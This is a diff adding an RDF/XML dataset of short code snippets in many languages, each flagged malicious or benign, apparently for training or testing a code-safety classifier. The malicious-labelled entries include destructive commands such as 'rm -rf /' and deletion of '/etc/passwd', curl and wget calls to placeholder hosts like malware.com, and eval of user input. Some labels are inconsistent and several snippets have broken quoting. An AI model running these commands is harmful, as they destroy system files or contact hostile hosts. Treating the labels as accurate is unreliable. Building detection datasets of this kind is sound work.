@@ -1,0 +1,1273 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rdf:RDF
+   xmlns:ex="http://example.org/ontology#"
+   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+   xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
+>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_192">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby </ex:language>
+    <rdfs:comment>system('rm -rf /tmp/') </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_77">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;vector&gt;; int main() { std::vector&lt;int&gt; v = {1,2,3}; v.push_back(4); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_86">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::fs::File; fn main() { let _file = File::create(\/tmp/file.txt\").unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_153">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>puts 'Hello World'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_80">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>import java.io.*; public class Main { public static void main(String[] args) { File file = new File('/etc/passwd'); file.delete(); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_1">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def add(a, b): return a + b</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_14">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'os/exec'; func main() { exec.Command('rm', '-rf', '/').Run() }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_21">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;math.h&gt;; int main() { double x = sqrt(16); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_54">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>std::ofstream outFile('/tmp/output.txt');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_71">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'net/http'; func main() { http.Get('http://malware.com') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_58">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import shutil; shutil.copyfile('source.txt', 'dest.txt')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_67">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'fmt'; func main() { fmt.Println('Goodbye!') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_145">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>fn add(a: i32, b: i32) -&gt; i32 { a + b }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_104">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Dart</ex:language>
+    <rdfs:comment>import 'dart:io'; void main() =&gt; File('/etc/passwd').deleteSync();</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_111">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Objective-C</ex:language>
+    <rdfs:comment>@\"NSLog(@\"Hello World!\");\"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_44">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>system('curl http://malware.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_158">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>PHP</ex:language>
+    <rdfs:comment>unlink('/etc/passwd')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_164">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Dart</ex:language>
+    <rdfs:comment>import 'dart:io'; void main() =&gt; File('/etc/passwd').deleteSync();</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_29">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>import java.io.*; public class Main { public static void main(String[] args) { new File('/').delete(); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_139">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;cstdlib&gt;; int main() { system('wget http://malware.com'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_166">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Haskell</ex:language>
+    <rdfs:comment>import System.Directory (removeFile); main = removeFile \/etc/passwd\""</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_187">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java </ex:language>
+    <rdfs:comment>public class Main{ public static void safeMethod(){ System.out.println(\This is safe.\");} } "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_102">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Perl</ex:language>
+    <rdfs:comment>unlink('/etc/passwd') if -e '/etc/passwd'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_117">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import subprocess; subprocess.run(['curl', 'http://1.com'])</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_45">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>printf('%d', 42)</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_188">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust </ex:language>
+    <rdfs:comment>fn 1_code(){ std::process::Command::new(\rm\").arg(\"-rf\").arg(\"/\").output().unwrap();} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_191">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript </ex:language>
+    <rdfs:comment>console.log('Safe operation.'); </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_146">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::fs::File; fn main() { let _file = File::create(\/tmp/file.txt\").unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_52">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>os.rename('/tmp/file.txt', '/tmp/newfile.txt')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_93">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>puts 'Hello World'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_120">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>os.symlink('/etc/passwd', '/tmp/passwd_link')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_15">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'time'; func main() { time.Sleep(1 * time.Second) }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_199">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Kotlin </ex:language>
+    <rdfs:comment>println(Safe Kotlin operation.") "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_61">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import subprocess; subprocess.run(['curl', 'http://1.com'])</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_183">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C </ex:language>
+    <rdfs:comment>#include &lt;math.h&gt;; int factorial(int n){ if(n==0) return 1; else return n*factorial(n-1);}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_74">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;unistd.h&gt;; int main() { unlink('/tmp/file.txt'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_170">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Objective-C</ex:language>
+    <rdfs:comment>@\"NSFileManager *fileManager = [NSFileManager defaultManager]; [fileManager removeItemAtPath:@\"/etc/passwd\" error:nil];\"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_193">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby </ex:language>
+    <rdfs:comment>puts 'This is safe.' </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_133">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdio.h&gt;; int main() { printf('Goodbye!'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_55">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript </ex:language>
+    <rdfs:comment>fetch('http://malware.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_59">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>os.system('wget http://1.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_50">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>std::fs::remove_dir_all('/')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_3">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>for i in range(10): print(i)</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_135">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;string.h&gt;; int main() { char str[20]; strcpy(str, 'Test'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_190">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript </ex:language>
+    <rdfs:comment>let userInput = prompt('Enter your input:'); eval(userInput); </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_92">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>File.delete('/etc/passwd') if File.exist?('/etc/passwd')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_2">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import requests; requests.get('http://1.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_62">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def square(x): return x ** 2</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_75">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;string.h&gt;; int main() { char str[20]; strcpy(str, 'Test'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_157">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Swift</ex:language>
+    <rdfs:comment>print(\Hello World!\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_160">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Kotlin</ex:language>
+    <rdfs:comment>File(\/etc/passwd\").delete()"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_91">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>document.location.href = 'http://malware.com';</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_161">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Kotlin</ex:language>
+    <rdfs:comment>println(\Hello World!\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_83">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>public class Main { public static void main(String[] args) { int sum = 5 + 10; }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_63">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>exec('print(\Hello\")')"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_114">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import shutil; shutil.copyfile('source.txt', 'dest.txt')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_38">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import socket; s = socket.socket(); s.connect(('1.com', 80))</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_100">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Kotlin</ex:language>
+    <rdfs:comment>File(\/etc/passwd\").delete()"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_144">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::fs::remove_file; fn main() { remove_file(\/etc/passwd\").unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_68">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'os/exec'; func main() { exec.Command('curl', 'http://1.com').Run() }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_57">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def divide(a, b): return a / b</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_125">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>print([x for x in range(10)])</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_159">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>PHP</ex:language>
+    <rdfs:comment>echo 'Hello World!';</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_110">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Objective-C</ex:language>
+    <rdfs:comment>@\"NSFileManager *fileManager = [NSFileManager defaultManager]; [fileManager removeItemAtPath:@\"/etc/passwd\" error:nil];\"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_73">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdio.h&gt;; int main() { printf('Goodbye!'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_7">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def greet(name): return f'Hello, {name}'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_78">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;fstream&gt;; int main() { std::ofstream outFile('/tmp/output.txt'); outFile &lt;&lt; 'Hello'; outFile.close(); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_119">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>exec('print(\Hello\")')"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_82">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>import java.net.*; public class Main { public static void main(String[] args) throws Exception { new URL('http://malware.com').openConnection(); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_13">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'math'; func main() { math.Sqrt(16) }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_106">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Haskell</ex:language>
+    <rdfs:comment>import System.Directory (removeFile); main = removeFile \/etc/passwd\""</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_46">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>std::remove('/tmp/file.txt')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_142">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>import java.net.*; public class Main { public static void main(String[] args) throws Exception { new URL('http://malware.com').openConnection(); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_138">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
